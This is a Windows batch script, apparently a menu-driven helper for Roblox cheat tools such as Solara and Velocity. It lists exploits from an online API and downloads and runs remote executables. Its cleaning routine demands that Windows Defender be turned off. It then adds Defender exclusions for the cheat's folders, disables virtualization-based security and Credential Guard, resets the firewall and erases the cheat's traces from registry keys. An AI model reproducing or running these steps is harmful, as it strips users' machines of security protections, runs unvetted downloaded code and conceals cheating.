@echo off
set "powershellPath=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
title D4R4N0X-V0.2.1B
chcp 65001 >nul
:MENU
cls
Color 0C & Mode con cols=87 lines=30
echo.
echo    ▄████████ ███    █▄     ▄███████▄    ▄███████▄  ▄██████▄     ▄████████     ███     
echo   ███    ███ ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ ▀█████████▄ 
echo   ███    █▀  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███    ▀███▀▀██ 
echo   ███        ███    ███   ███    ███   ███    ███ ███    ███  ▄███▄▄▄▄██▀     ███   ▀ 
echo ▀███████████ ███    ███ ▀█████████▀  ▀█████████▀  ███    ███ ▀▀███▀▀▀▀▀       ███     
echo          ███ ███    ███   ███          ███        ███    ███ ▀███████████     ███     
echo    ▄█    ███ ███    ███   ███          ███        ███    ███   ███    ███     ███     
echo  ▄████████▀  ████████▀   ▄████▀       ▄████▀       ▀██████▀    ███    ███    ▄████▀   
echo                                                               ███    ███          
echo.   
echo        ▄████████    ▄████████ ███▄▄▄▄       ███        ▄████████    ▄████████          
echo       ███    ███   ███    ███ ███▀▀▀██▄ ▀█████████▄   ███    ███   ███    ███          
echo       ███    █▀    ███    █▀  ███   ███    ▀███▀▀██   ███    █▀    ███    ███          
echo       ███         ▄███▄▄▄     ███   ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀          
echo       ███        ▀▀███▀▀▀     ███   ███     ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀            
echo       ███    █▄    ███    █▄  ███   ███     ███       ███    █▄  ▀███████████          
echo       ███    ███   ███    ███ ███   ███     ███       ███    ███   ███    ███          
echo       ████████▀    ██████████  ▀█   █▀     ▄████▀     ██████████   ███    ███          
echo                                                                    ███    ███          




echo.
echo [1].{Clean roblox/exploits/bloxstrap/etc} - (Velocity, Solara)
echo [2].{Fix Solara version Missmatch} 
echo [3].{Downgrade Roblox Version} - (Bloxstrap)
echo [4].{Download Bloxstrap} - (Fast and Safe) 
echo [5].{Exploits online} - (PULSERY PROVIDED)
echo.
echo [6]. Exit {Autodelete this bat}
echo.
set /p choice=(1-5) SELECT: 

if "%choice%"=="1" goto CLEAR
if "%choice%"=="2" goto FIXEXPL
if "%choice%"=="3" goto DOWNGRADEROBLOX
if "%choice%"=="4" goto FIX
if "%choice%"=="5" goto EXPLOITS
if "%choice%"=="6" exit

goto MENU

:EXPLOITS
color 0C
mode con: cols=54 lines=30
powershell -command ^
"$h = $Host.UI.RawUI; $h.BufferSize = New-Object System.Management.Automation.Host.Size(54, 500)"
setlocal enabledelayedexpansion
set "JQ_FILE=jq.exe"
set "JQ_URL=https://github.com/jqlang/jq/releases/download/jq-1.7.1/jq-windows-amd64.exe"
if not exist "%JQ_FILE%" (
    curl -L -o "%JQ_FILE%" "%JQ_URL%"
    if errorlevel 1 (
        pause
        echo ERR JQ
        exit /b
    )
)

curl -s -X GET "https://api.pulsery.live/api/exploits" -H "Content-Type: application/json" > exploits.json
if errorlevel 1 (
    pause
    echo ERR API
    exit /b
)

:: Выводим расширенную информацию
echo /====================================================\
echo                 \\\...EXPLOITS...\\\
echo \====================================================/

%JQ_FILE% -r ".[] | \"Title: \(.title)\nVersion: \(.version)\nUpdated: \(.updatedDate)\nDetected: \(.detected)\nCertified: \(.pulseryCertified)\nCost: \(.cost // \"Free\")\nUpdate Status: \(.updateStatus)\nWebsite: \(.websitelink // \"N/A\")\nDiscord: \(.discordlink // \"N/A\")\nPlatform: \(.platform)\n====================================================\"" exploits.json
pause
goto MENU

:OFFLINE
cls
echo.
echo FUCK YOU >:()
pause
goto MENU

:DOWNGRADEROBLOX
cls
Color 0E & Mode con cols=58 lines=27
echo /====================================================\
echo  \\\...Downloading and Running Roblox Downgrader...\\\
echo \====================================================/
"%powershellPath%" -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ActualMasterOogway/Roblox-Downgrader/main/RobloxDowngrader.exe' -OutFile '%temp%\RobloxDowngrader.exe'; Start-Process '%temp%\RobloxDowngrader.exe' -Wait"

if %errorlevel% neq 0 (
    color 0C
    echo /====================================================\
    echo \\\.....ERROR: Failed to run Roblox Downgrader.....\\\
    echo \====================================================/
) else (
    echo /====================================================\
    echo \\\...Successfully fixed Roblox version mismatch...\\\
    echo \====================================================/
)
pause
goto MENU
pause

:CLEAR
cls
color 09
Color 0E & Mode con cols=54 lines=27
echo /====================================================\
echo            \\\.....S.T.A.R.T.E.D...\\\        
echo \====================================================/
echo.

:: Check if Windows Defender is enabled
powershell -Command "& {(Get-MpComputerStatus).RealTimeProtectionEnabled}" | findstr "True" >nul
if %errorlevel%==0 (
    color 0C
    cls
    echo /====================================================\
    echo     1ERR- Windows Defender is enabled. Turn it off.        
    echo /====================================================/
    pause
    goto MENU
)

:: Kill processes before checking
for %%p in (RobloxPlayerBeta.exe Velocity.exe "Roblox Game Client.exe" Bloxstrap.exe Solara.exe) do (
    taskkill /IM %%p /F >nul 2>&1
    tasklist /FI "IMAGENAME eq %%p" 2>NUL | find /I "%%p" >NUL && (
        color 0C
        cls
        echo /====================================================\
        echo      1ERR- %%p needs to be closed.
        echo /====================================================/
        pause
        goto MENU
    )
)

echo /====================================================\
echo    \\\...Deleting Temp Files of Roblox...\\\             /---1\15---\
echo \====================================================/
rd /s /q %temp%\Roblox*
cls

echo /====================================================\
echo        \\\...Deleting Blox/fish<strap> Logs...\\\        /---2\15---\
echo \====================================================/
rd /s /q %localappdata%\Bloxstrap\Logs*
rd /s /q %localappdata%\Fishstrap\Logs*
cls

echo /====================================================\
echo    \\\...Deleting Solara from Register ...\\\            /---3\15---\ 
echo \====================================================/
setlocal enabledelayedexpansion
for /f "tokens=*" %%A in ('reg query "HKLM\SYSTEM\ControlSet001\Services\bam\State\UserSettings" /s /f "Solara" 2^>nul ^| findstr "HKEY"') do (
    reg delete "%%A" /f >nul 2>&1
)
for /f "tokens=*" %%B in ('reg query "HKLM\SOFTWARE\Microsoft\Tracing" /s /f "Solara" 2^>nul ^| findstr "HKEY"') do (
    reg delete "%%B" /f >nul 2>&1
)

cls


echo /====================================================\
echo   \\\...Deleting Roblox from AppData\Local...\\\         /---4\15---\
echo \====================================================/

cd /d "%localappdata%\Roblox"

for /d %%i in (*) do ( if /i not "%%i"=="LocalStorage" ( rmdir /s /q "%%i" ) )

for %%f in (*.*) do (
    echo %%f | find /i "Cookies" > nul
    if errorlevel 1 ( del /q "%%f" )
)

cls


echo /====================================================\
echo  \\\...Clearing Potential Downgrades + Versions..\\\     /---5\15---\
echo \====================================================/

#powershell -Command "Start-Process 'https://clientsettingscdn.roblox.com/v2/client-version/WindowsPlayer' -Wait"

attrib -h -s -r %localappdata%\Bloxstrap\Versions\* /s /d
attrib -h -s -r %localappdata%\Roblox\Versions\* /s /d
attrib -h -s -r %localappdata%\Fishstrap\Versions* /s /d

rd /s /q %localappdata%\Fishstrap\Versions\
rd /s /q %localappdata%\Bloxstrap\Versions\
rd /s /q %localappdata%\Roblox\Versions\
cls

echo /====================================================\
echo \\\...Cleaning Roblox Files from Program Files..\\\      /---6\15---\
echo \====================================================/
rd /s /q %localappdata%\\Roblox\\LocalStorage\\*
rd /s /q %localappdata%\\Roblox\\logs\\*
cls

echo /====================================================\
echo      \\\...Deleting Roblox in Registry...\\\             /---7\15---\
echo \====================================================/
reg delete "HKEY_CURRENT_USER\Software\Roblox" /f > NUL 2>&1
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Roblox" /f > NUL 2>&1
cls

echo /====================================================\
echo                \\\Forcing time sync......\\\             /---8\15---\ 
echo \====================================================/

net stop w32time
w32tm /unregister
w32tm /register
net start w32time
w32tm /resync /force


echo /====================================================\
echo          \\\...Cleaning TEMP...\\\                       /---9\15---\
echo \====================================================/
for %%f in (%USERPROFILE%\AppData\LocalLow\Roblox\*.*) do (
    echo %%~nxf | find /i "Cookies" > NUL
    if errorlevel 1 (
        del /q "%%f"
    )
)
for /d %%p in ("%temp%\*.*") do rmdir "%%p" /s /q
del /s /q "%temp%\*.*"
cls

echo /====================================================\  
echo        \\\...Resetting Network and DNS...\\\             /---10\15---\
echo \====================================================/

echo \\\...Resetting Network and DNS...\\\
net stop dnscache
net stop nlasvc

echo \\\...Resetting network components...\\\
netsh int ip reset
netsh winsock reset
netsh advfirewall reset

echo \\\...Flushing DNS...\\\
ipconfig /flushdns
ipconfig /registerdns

echo \\\...Renewing IP address...\\\
start /b ipconfig /release 
start /b ipconfig /renew 

echo \\\...Restarting network services...\\\
net start Dhcp 
net start dnscache
net start nlasvc 
cls

echo /====================================================\  
echo        \\\...Adding to Windows WhiteList...\\\           /---11\15---\
echo \====================================================/
powershell -Command "Add-MpPreference -ExclusionPath \"$env:USERPROFILE\AppData\Local\Temp\Solara.Dir\""
powershell -Command "Add-MpPreference -ExclusionPath \"$env:ProgramData\Solara\""
cls

echo /====================================================\  
echo    \\\... ...\\\      /---12\15---\
echo \====================================================/

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard" /v "Enabled" /t REG_DWORD /d 0 /f
#powershell -Command "Start-Process 'https://github.com/VollRagm/NalFix/releases/download/1.0/NalFix.exe' -Wait"
cls

echo /====================================================\  
echo    \\\... ...\\\      /---13\15---\
echo \====================================================/

#powershell -Command "Start-Process 'https://download.microsoft.com/download/1/7/1/1718CCC4-6315-4D8E-9543-8E28A4E18C4C/dxwebsetup.exe' -Wait"
#powershell -Command "Start-Process 'https://download.visualstudio.microsoft.com/download/pr/5cc0a375-ebc5-4a27-8a76-aa43097a8949/ED1967C2AC27D806806D121601B526F84E497AE1B99ED139C0C4C6B50147DF4A/VC_redist.x86.exe' -Wait"
#powershell -Command "Start-Process 'https://download.visualstudio.microsoft.com/download/pr/368cc6bf-087b-49f9-93e6-ab05b70a58e0/814E9DA5EC5E5D6A8FA701999D1FC3BADDF7F3ADC528E202590E9B1CB73E4A11/VC_redist.x64.exe' -Wait"

cls

echo /====================================================\  
echo    \\\... EMPTY FUNCTION ...\\\      /---14\15---\
echo \====================================================/



cls

echo /====================================================\  
echo    \\\... JUST WAIT :( ...\\\      /---15\15---\
echo \====================================================/

sfc /scannow
DISM /Online /Cleanup-Image /RestoreHealth
mdsched.exe
msconfig

cls
echo /====================================================\ 
echo       \\\...Finished-d-d-d-d-d-d-d-d-d-d-d-d...\\\      
echo \====================================================/
pause
goto MENU


:FIXEXPL
cls
Color 0E & Mode con cols=54 lines=27
echo /====================================================\
echo      \\\...Downloading Solara from github...\\\               
echo \====================================================/
powershell -Command "Invoke-WebRequest -Uri https://github.com/Pikinez/ssl/raw/refs/heads/main/Solara.zip -OutFile %TEMP%\Solara.zip"
if exist %TEMP%\Solara.zip (
    cls
    color 0E
    echo /====================================================\
    echo             \\\...Unpacking Solara...\\\               
    echo \====================================================/
    powershell -Command "Expand-Archive -Path %TEMP%\Solara.zip -DestinationPath %programdata% -Force"
    del %TEMP%\Solara.zip
    cls
    echo /====================================================\
    echo    \\\...Solara was downloaded and installed...\\\               
    echo \====================================================/
) else (
    color 0C
    echo /====================================================\
    echo      \\\...Error, Solara was not downloaded...\\\               
    echo \====================================================/
)
pause
goto MENU

:FIX3
echo /====================================================\
echo            \\\...Bloxstrap Downlaoding...\\\ 
echo \====================================================/
powershell -Command "Start-Process 'https://objects.githubusercontent.com/github-production-release-asset-2e65be/520583586/f5975dfa-97e1-489e-9f14-41f125402efc?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20241019%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20241019T153845Z&X-Amz-Expires=300&X-Amz-Signature=b130eb5c62fb6149c3bf01b6bf0e4d0918290c370b0e450b6416f7b3ec0eac9e&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DBloxstrap-v2.8.0.exe&response-content-type=application%2Foctet-stream' -Wait"
echo /====================================================\
echo            \\\...Process Finished!...\\\ 
echo \====================================================/
pause
goto MENU

